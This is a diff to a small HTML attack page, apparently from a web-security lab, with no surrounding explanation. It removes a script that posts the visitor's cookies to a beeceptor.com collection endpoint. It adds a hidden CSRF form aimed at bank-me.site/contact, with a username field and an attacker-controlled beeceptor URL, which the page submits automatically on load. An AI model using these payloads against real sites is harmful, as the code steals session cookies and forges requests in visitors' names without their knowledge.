@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <form action="http://bank-me.site/contact" method="POST" id="csrf-form">
+      <input type="hidden" name="member_username" value="tarnaud_empire">
+      <input type="hidden" name="url" value="https://cihan.free.beeceptor.com">
+    </form>
+
     <script>
-      fetch("https://monprojetest.free.beeceptor.com/cookie", {
-        method: "POST",
-        body: document.cookie
-      });
+      document.getElementById('csrf-form').submit();
     </script>
   </body>
 </html>
